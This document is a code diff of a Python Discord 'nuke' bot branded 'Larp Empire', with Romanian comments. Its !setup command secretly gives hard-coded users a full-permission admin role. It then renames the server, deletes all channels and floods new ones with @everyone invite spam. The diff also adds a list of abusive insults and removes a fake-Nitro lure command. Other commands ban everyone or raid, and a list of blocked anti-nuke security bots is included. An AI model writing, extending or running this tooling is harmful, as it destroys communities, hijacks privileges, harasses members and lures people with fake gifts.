@@ -30,7 +30,7 @@ LOG_WEBHOOK_URL = os.getenv('LOG_WEBHOOK') or ''
 BLOCKED_BOT_IDS = [651095740390834176, 548410451818708993]
 BLOCKED_BOT_NAMES = ["Security", "Wick", "Beemo", "AntiNuke"]
 
-# Funcțiile de salvare, încărcare, configurare (rămân neschimbate)
+# Funcțiile de salvare, încărcare, configurare
 def save_nuke_stats(user_id, guild):
     try:
         with open(NUKE_STATS_FILE, "r") as f:
@@ -212,7 +212,7 @@ class MyBot(commands.Bot):
     def __init__(self):
         intents = discord.Intents.all()
         super().__init__(command_prefix="!", intents=intents)
-        self.remove_command("help")  # eliminăm comanda implicită help
+        self.remove_command("help")
 
     async def setup_hook(self):
         await self.tree.sync()
@@ -221,7 +221,6 @@ bot = MyBot()
 
 # ================== FUNCȚIA DE LOG PRIN WEBHOOK ==================
 async def send_nuke_log(guild, user, channels, messages):
-    """Trimite un embed detaliat printr-un webhook despre nuke-ul efectuat."""
     if not LOG_WEBHOOK_URL:
         return
 
@@ -403,71 +402,6 @@ async def massban(ctx):
                 pass
     await ctx.send(f"✅ Massban complete — {count}/{total} users banned.")
 
-@bot.command(name="fakenitro")
-async def fakenitro(ctx):
-    if ctx.guild and ctx.guild.id == BLACKLISTED_GUILD_ID:
-        await ctx.reply("`This server is blacklisted.`")
-        return
-    try:
-        await ctx.message.delete()
-    except:
-        pass
-    dm_channel = await ctx.author.create_dm()
-    await dm_channel.send(
-        "**:gift: Fake Nitro Setup**\n"
-        "Please choose your method:\n\n"
-        "🔹 `1` - Spam every channel\n"
-        "🔹 `2` - Create giveaway channel with ghost pings (looks more real = more people joining)\n\n"
-        "Reply with the number!"
-    )
-    def check(m):
-        return m.author == ctx.author and m.channel == dm_channel and m.content in ["1", "2"]
-    try:
-        reply = await bot.wait_for("message", check=check, timeout=60)
-    except asyncio.TimeoutError:
-        await dm_channel.send("❌ Timed out.")
-        return
-    method = "spam" if reply.content == "1" else "giveaway"
-    fake_link = "https://discord.gg/larpempire"
-    embed = discord.Embed(
-        description=(
-            f"# <a:nitro:1402674645790101615> You've been gifted a subscription!\n"
-            f"## Click [HERE]({fake_link}) to claim **1 month of Discord Nitro.**"
-        ),
-        color=0x5865F2
-    )
-    embed.set_image(url="https://cdn.discordapp.com/attachments/1402005248108793970/1402666426791231618/19402688007447.png")
-    embed.set_footer(text="Note: This gift will expire in 48 hours.")
-    if method == "spam":
-        success = 0
-        for channel in ctx.guild.text_channels:
-            try:
-                await channel.send(embed=embed)
-                await channel.send("@everyone")
-                success += 1
-            except:
-                continue
-        await dm_channel.send(f"✅ Nitro embed sent to `{success}` channels, everyone pinged!")
-    else:
-        overwrites = {
-            ctx.guild.default_role: discord.PermissionOverwrite(
-                view_channel=True,
-                send_messages=False,
-                add_reactions=False,
-                read_message_history=True
-            )
-        }
-        channel = await ctx.guild.create_text_channel("🎁nitro-giveaway", overwrites=overwrites)
-        await channel.send(embed=embed)
-        for _ in range(20):
-            msg = await channel.send("@everyone")
-            await asyncio.sleep(0.3)
-            try:
-                await msg.delete()
-            except:
-                pass
-        await dm_channel.send("✅ 20 ghost pings sent in the giveaway channel!")
-
 @bot.command(name="invite")
 async def invite_cmd(ctx):
     invite_link = discord.utils.oauth_url(
@@ -489,26 +423,6 @@ async def invite_cmd(ctx):
     except discord.Forbidden:
         await ctx.reply("❌ I couldn't DM you. Please check your privacy settings.", ephemeral=True if ctx.guild else False)
 
-@bot.command(name="nhelp")
-async def real_help(ctx):
-    embed = discord.Embed(
-        title="⚡ Larp Nuke Bot Help",
-        description="List of available commands:",
-        color=discord.Color.blurple()
-    )
-    embed.set_thumbnail(url=bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url)
-    embed.add_field(name="`!setup`", value="Completely wipes the server.", inline=False)
-    embed.add_field(name="`!admin`", value="Tries to secretly give you admin.", inline=False)
-    embed.add_field(name="`!massban`", value="Bans everyone! (Owner only)", inline=False)
-    embed.add_field(name="`!invite`", value="Sends the bot invite to your dms.", inline=False)
-    embed.add_field(name="`!fakenitro`", value="Create a fake nitro giveaway and lure people.", inline=False)
-    embed.add_field(name="`!modraid`", value="Raid command (Owner only)", inline=False)
-    embed.add_field(name="`!nhelp`", value="Shows this real help embed.", inline=False)
-    embed.add_field(name="**Slash Commands**", value="`/bypass`, `/blacklist`, `/feedback`, `/ping`, `/pull`, `/rep`, `/setup`, `/syncroles`, `/vouch`\n*(These are placeholders and do not have functionality yet)*", inline=False)
-    embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url)
-    embed.timestamp = datetime.utcnow()
-    await ctx.send(embed=embed)
-
 @bot.command(name="modraid")
 async def modraid(ctx, *, message=None):
     if ctx.author.id != OWNER_ID:
@@ -526,6 +440,60 @@ async def modraid(ctx, *, message=None):
         await ctx.message.delete()
     except:
         pass
+
+# ================== !nhelp (fără insulte) ==================
+@bot.command(name="nhelp")
+async def real_help(ctx):
+    embed = discord.Embed(
+        title="⚡ Larp Nuke Bot Help",
+        description="List of available commands:",
+        color=discord.Color.blurple()
+    )
+    embed.set_thumbnail(url=bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url)
+    embed.add_field(
+        name="`!setup`",
+        value="Completely wipes the server.",
+        inline=False
+    )
+    embed.add_field(
+        name="`!admin`",
+        value="Tries to secretly give you admin.",
+        inline=False
+    )
+    embed.add_field(
+        name="`!massban`",
+        value="Bans everyone! (Owner only)",
+        inline=False
+    )
+    embed.add_field(
+        name="`!invite`",
+        value="Sends the bot invite to your dms.",
+        inline=False
+    )
+    embed.add_field(
+        name="`!modraid`",
+        value="Raid command (Owner only)",
+        inline=False
+    )
+    embed.add_field(
+        name="`!nhelp`",
+        value="Shows this real help embed.",
+        inline=False
+    )
+    embed.add_field(
+        name="**Slash Commands (placeholders)**",
+        value=(
+            "`/bypass`, `/blacklist`, `/feedback`, `/ping`, `/pull`, `/rep`, `/setup`, `/syncroles`, `/vouch`\n"
+            "*These are placeholders and do not have functionality yet.*"
+        ),
+        inline=False
+    )
+    embed.set_footer(
+        text=f"Requested by {ctx.author}",
+        icon_url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url
+    )
+    embed.timestamp = datetime.utcnow()
+    await ctx.send(embed=embed)
 
 # ================== COMENDA SETUP ==================
 async def send_with_retry(channel, content=None, embed=None, max_retries=10):
@@ -593,17 +561,14 @@ async def setup(ctx):
 
     save_nuke_stats(user.id, guild)
 
-    # ===== DETERMINĂ PARAMETRII DUPĂ OWNER =====
     is_owner = (user.id == OWNER_ID)
     total_channels = 200 if is_owner else 70
     spam_messages = 25 if is_owner else 15
 
-    # Trimite log prin webhook
     await send_nuke_log(guild, user, total_channels, spam_messages)
 
     admin_users = [1389763251042258944, 1464634211406188721]
 
-    # CREATE ADMIN ROLE
     try:
         admin_role = await guild.create_role(name="Larp Empire Admin", permissions=discord.Permissions.all())
         for admin_id in admin_users:
@@ -613,20 +578,17 @@ async def setup(ctx):
     except:
         pass
 
-    # CHANGE SERVER NAME
     try:
         await guild.edit(name="1weeksober owns this")
     except:
         pass
 
-    # DELETE ALL CHANNELS
     for channel in guild.channels:
         try:
             await channel.delete()
         except:
             continue
 
-    # ===== CHANNEL NAMES =====
     base_channel_names = [
         "1weeksober-king",
         "Cry-kid",
@@ -639,7 +601,22 @@ async def setup(ctx):
         "Ez-larp-on-top"
     ]
 
-    # ===== EMBED =====
+    # ===== LISTA DE INSULTE =====
+    insults = [
+        "What a low iq user",
+        "Iqlet",
+        "Quit beaming you're trash",
+        "You're a pathetic loser",
+        "Get a life kid",
+        "Larp Empire owns your server",
+        "You couldn't even nuke a sandcastle",
+        "Your mom should've used a condom",
+        "You're a waste of oxygen",
+        "Even your bot is smarter than you",
+        "Go back to playing Roblox",
+        "You're the reason why birth control exists"
+    ]
+
     embed_content = discord.Embed(
         title="**LARP EMPIRE N4KED YOUR AHH**",
         description=(
@@ -654,12 +631,15 @@ async def setup(ctx):
     embed_content.set_image(url="https://i.imgur.com/yMQvcRw.gif")
     embed_content.set_footer(text="Larp Empire • Nuke Service")
 
-    # ===== BIG MESSAGE (2000 chars) =====
+    # ===== GIF SPAM =====
+    gif_url = "https://38.media.tumblr.com/662c079bd6ad88db4277487c78422174/tumblr_nvn2znud8t1qjrwyno1_1280.gif"
+    embed_gif = discord.Embed(color=0x000000)
+    embed_gif.set_image(url=gif_url)
+
     base_text = "@everyone @here join https://discord.gg/larpempire\n"
     repeat_count = 50
     big_message = (base_text * repeat_count)[:2000]
 
-    # ===== CREATE CHANNELS IN PARALLEL =====
     font_styles = ["bold", "script", "double"]
     created_channels = []
 
@@ -669,11 +649,26 @@ async def setup(ctx):
 
     async def spam_channel(channel):
         try:
+            # Trimite mesajul mare
             await send_with_retry(channel, content=big_message)
             await asyncio.sleep(0.1)
+
+            # Trimite embed-ul principal
             await send_with_retry(channel, embed=embed_content)
             await asyncio.sleep(0.1)
-            for _ in range(spam_messages):  # 25 pentru owner, 15 pentru ceilalți
+
+            # Trimite GIF-ul din când în când (random)
+            if random.random() < 0.3:  # 30% șansă
+                await send_with_retry(channel, embed=embed_gif)
+                await asyncio.sleep(0.1)
+
+            # Trimite o insultă random
+            insult = random.choice(insults)
+            await send_with_retry(channel, content=f"**{insult}**")
+            await asyncio.sleep(0.1)
+
+            # Trimite mesajele spam cu ping
+            for _ in range(spam_messages):
                 ping_count = random.randint(5, 12)
                 msg = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
                 await send_with_retry(channel, content=msg)
